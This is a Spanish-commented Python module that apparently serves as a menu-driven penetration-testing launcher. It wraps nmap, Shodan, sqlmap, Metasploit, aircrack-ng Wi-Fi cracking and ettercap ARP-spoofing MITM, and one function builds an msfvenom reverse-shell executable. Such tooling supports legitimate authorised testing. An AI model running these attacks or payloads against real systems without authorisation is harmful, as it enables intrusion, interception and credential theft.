import os
import subprocess
import shodan
import requests
from .utils import pause_before_return, safe_run, print_colored
from .session import save_log
from dotenv import load_dotenv
load_dotenv()

SHODAN_API_KEY = os.getenv("SHODAN_API_KEY")
ZAP_API_KEY    = os.getenv("ZAP_API_KEY")
BURP_API_KEY   = os.getenv("BURP_API_KEY")

### 1 Reconocimiento ###

@pause_before_return
def run_nmap(target, scan_type="default", session_dir=None):
    """
    Ejecuta un escaneo Nmap optimizado según el tipo de escaneo seleccionado.
    Guarda los resultados en el directorio de sesión.
    :param target: IP o dominio objetivo.
    :param scan_type: Tipo de escaneo ("default", "quick", "stealth", "detailed").
    :param session_dir: Directorio de la sesión actual.
    """
    print_colored(f"Ejecutando Nmap en {target} con el modo '{scan_type}'...", "blue")

    scan_modes = {
        "default": ["nmap", "-sS", "-T4", "-A", "-p-", target],
        "quick":   ["nmap", "-p-", "--open", "-T4", "--min-rate", "5000", "-vv", "-n", "-Pn", target],
        "stealth": ["nmap", "-sS", "-T2", "-p-", "-n", target],
        "detailed":["nmap", "-sS", "-T4", "-A", "-p-", "-vv", target],
    }

    if scan_type not in scan_modes:
        print_colored("Tipo de escaneo no válido. Usando 'default'.", "yellow")
        scan_type = "default"

    command = scan_modes[scan_type]
    # Usamos safe_run para logging y manejo de errores
    result = safe_run(command)

    file_name = f"nmap_{scan_type}_results.txt"
    output = result.stdout if result and result.stdout is not None else ""
    if session_dir:
        save_log(session_dir, file_name, output)
    else:
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(output)

    print_colored(f"Resultados guardados en {file_name}", "green")

@pause_before_return
def run_amass(domain, session_dir=None):
    """
    Ejecuta Amass para recolectar subdominios y guarda los resultados.
    """
    result = subprocess.run(
        ["amass", "enum", "-d", domain],
        stdout=subprocess.PIPE, text=True
    )
    file_name = f"amass_results_{domain}.txt"
    if session_dir:
        save_log(session_dir, file_name, result.stdout)
    else:
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(result.stdout)

    print(f"Resultados guardados en {file_name}")

@pause_before_return
def run_shodan_search(ip, session_dir=None):
    """
    Busca información en Shodan para una IP y guarda los resultados.
    """
    print(f"Buscando información sobre {ip} en Shodan...")
    try:
        api = shodan.Shodan(SHODAN_API_KEY)
        host = api.host(ip)

        file_name = f"shodan_results_{ip}.txt"
        if session_dir:
            save_log(session_dir, file_name, str(host))
        else:
            with open(file_name, "w") as file:
                file.write(str(host))

        print(f"Resultados guardados en {file_name}")

    except shodan.APIError as e:
        print(f"Error con la API de Shodan: {e}")

### 2 Análisis de Vulnerabilidades ###

@pause_before_return
def run_nikto(target, session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """
    Escaneo Nikto con tuning rápido y streaming de salida.
    """
    print(f"Ejecutando Nikto en {target} (tuning rápido)...")
    cmd = [
        "nikto",
        "-h", target,
        "-Tuning", "1",     # solo pruebas básicas
        "-Display", "V",    # muestra cada vulnerabilidad al vuelo
        "-timeout", "10"    # timeout de socket en segundos
    ]
    # usamos Popen para ver salida en directo
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        output = []
        for line in proc.stdout:
            print(line, end="")   # streaming
            output.append(line)
        proc.wait(timeout=300)     # matamos si pasa de 5 minutos
    except subprocess.TimeoutExpired:
        print_colored("Nikto ha superado el tiempo límite (5 min). Abortando.", "yellow")
        proc.kill()
    except Exception as e:
        print_colored(f"Error lanzando Nikto: {e}", "red")
        return

    if proc.returncode == 0:
        print_colored("Nikto ha terminado de analizar.", "green")
        results = "".join(output)
        file_name = f"nikto_results_{target}.txt"
        if session_dir:
            save_log(session_dir, file_name, results)
        else:
            with open(file_name, "w") as f:
                f.write(results)
        print(f"Resultados guardados en {file_name}")
    else:
        print_colored(f"Nikto terminó con código {proc.returncode}", "red")

@pause_before_return
def run_whatweb(target, session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """
    Ejecuta WhatWeb en el objetivo especificado y guarda los resultados en la carpeta de sesión.
    :param target: URL o IP objetivo.
    :param session_dir: Directorio de la sesión actual.
    """
    print(f"Ejecutando WhatWeb en {target}...")
    result = subprocess.run(["whatweb", target], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    if result.returncode == 0:
        print("WhatWeb ha terminado de analizar.")
        file_name = f"whatweb_results_{target}.txt"
        if session_dir:
            save_log(session_dir, file_name, result.stdout)
        else:
            with open(file_name, "w") as file:
                file.write(result.stdout)
        print(f"Resultados guardados en {file_name}")
    else:
        print(f"Hubo un error al intentar ejecutar WhatWeb: {result.stderr}")

### 3 Pentesting WEB ###

@pause_before_return
def run_gobuster(target, wordlist, session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """
    Ejecuta Gobuster para escaneo de directorios o subdominios y guarda los resultados.
    :param target: URL objetivo.
    :param wordlist: Ruta al archivo de wordlist.
    :param session_dir: Directorio de la sesión actual.
    """
    print(f"Ejecutando Gobuster en {target} con el wordlist {wordlist}...")
    result = subprocess.run(["gobuster", "dir", "-u", target, "-w", wordlist], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    if result.returncode == 0:
        print("Gobuster ha terminado el escaneo.")
        file_name = f"gobuster_results_{target}.txt"
        if session_dir:
            save_log(session_dir, file_name, result.stdout)
        else:
            with open(file_name, "w") as file:
                file.write(result.stdout)
    else:
        print(f"Hubo un error al intentar ejecutar Gobuster: {result.stderr}")

@pause_before_return
def run_owasp_zap(target, session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """
    Ejecuta OWASP ZAP para escaneo de seguridad web a través de su API y guarda los resultados.
    Omite el apikey si no está configurado en .env.
    """
    print(f"Ejecutando OWASP ZAP en {target}...")
    zap_url = "http://127.0.0.1:8080"
    params = {"url": target}
    if ZAP_API_KEY:
        params["apikey"] = ZAP_API_KEY

    response = requests.get(f"{zap_url}/JSON/ascan/action/scan", params=params)
    if response.status_code == 200:
        message = f"Escaneo iniciado en {target}. Espera a que ZAP termine."
        print(message)
        if session_dir:
            save_log(session_dir, f"zap_results_{target}.txt", message)
    else:
        error_message = f"Error al ejecutar el escaneo en ZAP: {response.text}"
        print(error_message)
        if session_dir:
            save_log(session_dir, f"zap_error_{target}.txt", error_message)

@pause_before_return
def run_burp_suite(target, session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """
    Ejecuta Burp Suite para escaneo de seguridad web a través de su API y guarda los resultados.
    Omite el apikey si no está configurado en .env (sólo disponible en Burp Pro + REST API).
    """
    print(f"Ejecutando Burp Suite en {target}...")
    burp_url = "http://127.0.0.1:8080"
    params = {"url": target}
    if BURP_API_KEY:
        params["apikey"] = BURP_API_KEY

    response = requests.get(f"{burp_url}/burp-api/v1/scan", params=params)
    if response.status_code == 200:
        message = f"Escaneo iniciado en {target} con Burp Suite."
        print(message)
        if session_dir:
            save_log(session_dir, f"burp_results_{target}.txt", message)
    else:
        error_message = f"Error al ejecutar el escaneo en Burp Suite: {response.text}"
        print(error_message)
        if session_dir:
            save_log(session_dir, f"burp_error_{target}.txt", error_message)

@pause_before_return
def run_sqlmap(target, session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """
    Ejecuta sqlmap para escaneo de vulnerabilidades SQLi y guarda los resultados.
    :param target: URL objetivo.
    :param session_dir: Directorio de la sesión actual.
    """
    print(f"Escaneando vulnerabilidades SQLi en {target} con sqlmap...")
    result = subprocess.run(["sqlmap", "-u", target, "--batch"], stdout=subprocess.PIPE, text=True)

    file_name = f"sqlmap_results_{target}.txt"
    if session_dir:
        save_log(session_dir, file_name, result.stdout)
    else:
        with open(file_name, "w") as file:
            file.write(result.stdout)

    print(f"Resultados guardados en {file_name}")

@pause_before_return
def run_xsstrike(target, session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """
    Ejecuta XSStrike para escaneo de vulnerabilidades XSS y guarda los resultados.
    :param target: URL objetivo.
    :param session_dir: Directorio de la sesión actual.
    """
    print(f"Escaneando vulnerabilidades XSS en {target} con XSStrike...")
    result = subprocess.run(["python3", "xsstrike.py", "-u", target], stdout=subprocess.PIPE, text=True)

    file_name = f"xsstrike_results_{target}.txt"
    if session_dir:
        save_log(session_dir, file_name, result.stdout)
    else:
        with open(file_name, "w") as file:
            file.write(result.stdout)

    print(f"Resultados guardados en {file_name}")

### 4 Explotación ###

@pause_before_return
def run_metasploit():
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """Ejecuta Metasploit Framework (requiere instalación previa)."""
    print("Ejecutando Metasploit Framework...")
    result = subprocess.run(["msfconsole"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    if result.returncode == 0:
        print("Metasploit ha arrancado correctamente.")
    else:
        print(f"Hubo un error al intentar ejecutar Metasploit: {result.stderr}")

def run_beef():
    """Ejecuta BeEF (requiere instalación previa)."""
    print("Ejecutando BeEF...")
    result = subprocess.run(["./beef"], cwd="/ruta/a/beef", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    if result.returncode == 0:
        print("BeEF ha arrancado correctamente.")
    else:
        print(f"Hubo un error al intentar ejecutar BeEF: {result.stderr}")

def run_empire():
    """Ejecuta Empire (requiere instalación previa)."""
    print("Ejecutando Empire...")
    result = subprocess.run(["./empire"], cwd="/ruta/a/empire", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    if result.returncode == 0:
        print("Empire ha arrancado correctamente.")
    else:
        print(f"Hubo un error al intentar ejecutar Empire: {result.stderr}")

### 5 Mobile Pentesting ###

@pause_before_return
def run_mobsf(session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """Ejecuta MobSF para análisis de aplicaciones móviles y guarda los logs."""
    print("Ejecutando MobSF...")
    result = subprocess.run(["python3", "manage.py", "runserver"], cwd="/ruta/a/mobsf", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    if result.returncode == 0:
        message = "MobSF ha arrancado correctamente en http://127.0.0.1:8000.\nUsa la interfaz web para subir y analizar aplicaciones móviles."
        print(message)
        if session_dir:
            save_log(session_dir, "mobsf_startup.txt", message)
    else:
        error_message = f"Hubo un error al intentar ejecutar MobSF: {result.stderr}"
        print(error_message)
        if session_dir:
            save_log(session_dir, "mobsf_error.txt", error_message)

@pause_before_return
def run_drozer(session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """Ejecuta Drozer para análisis de seguridad en aplicaciones Android y guarda los logs."""
    print("Ejecutando Drozer...")
    result = subprocess.run(["drozer", "console", "connect"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    if result.returncode == 0:
        message = "Drozer se ha conectado correctamente al dispositivo Android."
        print(message)
        if session_dir:
            save_log(session_dir, "drozer_results.txt", message)
    else:
        error_message = f"Hubo un error al intentar ejecutar Drozer: {result.stderr}"
        print(error_message)
        if session_dir:
            save_log(session_dir, "drozer_error.txt", error_message)

### 6 Pentesting RED ###

@pause_before_return
def run_aircrack_ng(session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """Ejecuta Aircrack-ng para auditoría de redes Wi-Fi y guarda los resultados."""
    print("\n--- Aircrack-ng ---")
    interface = input("Introduce la interfaz de red (ej. wlan0): ")
    subprocess.run(["sudo", "airmon-ng", "start", interface])

    capture_file = input("Introduce el nombre para el archivo de captura (ej. capture.cap): ")
    channel = input("Introduce el canal (ej. 1-13 o 'all' para escanear todos los canales): ")
    subprocess.run(["sudo", "airodump-ng", "-c", channel, "--write", capture_file, interface])
    
    wordlist = input("Introduce la ruta al archivo de diccionario (wordlist): ")
    bssid = input("Introduce el BSSID de la red a crackear (dirección MAC): ")
    result = subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, "-b", bssid, f"{capture_file}-01.cap"], stdout=subprocess.PIPE, text=True)

    if session_dir:
        save_log(session_dir, "aircrack_results.txt", result.stdout)

@pause_before_return
def run_ettercap(session_dir=None):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """Ejecuta Ettercap para análisis de redes y ataques MITM y guarda los logs."""
    print("\n--- Ettercap ---")
    
    mode = input("Selecciona el modo de ejecución:\n1. Modo texto\n2. Modo gráfico (GUI)\nSelecciona (1 o 2): ")
    
    if mode == "1":
        target1 = input("Introduce la IP del primer objetivo: ")
        target2 = input("Introduce la IP del segundo objetivo: ")
        result = subprocess.run(["sudo", "ettercap", "-T", "-M", "arp:remote", f"/{target1}/", f"/{target2}/"], stdout=subprocess.PIPE, text=True)
        
        if session_dir:
            save_log(session_dir, "ettercap_results.txt", result.stdout)

    elif mode == "2":
        print("Ejecutando Ettercap en modo gráfico...")
        subprocess.run(["sudo", "ettercap", "-G"])

### Payloads ###

@pause_before_return
def generate_payload(session_dir):
    print("0. Volver al menú principal")
    if input("Pulsa 0 y Enter para volver, o Enter para continuar: ") == "0":
        return
    """Genera un payload utilizando msfvenom y lo guarda en la carpeta de sesión."""
    lhost = input("Introduce la dirección IP (LHOST): ")
    lport = input("Introduce el puerto (LPORT): ")
    payload = input("Introduce el tipo de payload (ej. windows/meterpreter/reverse_tcp): ")
    output_file = os.path.join(session_dir, "payload.exe")
    print(f"Generando payload en {output_file}...")
    subprocess.run(["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", output_file])
    print("Payload generado exitosamente.")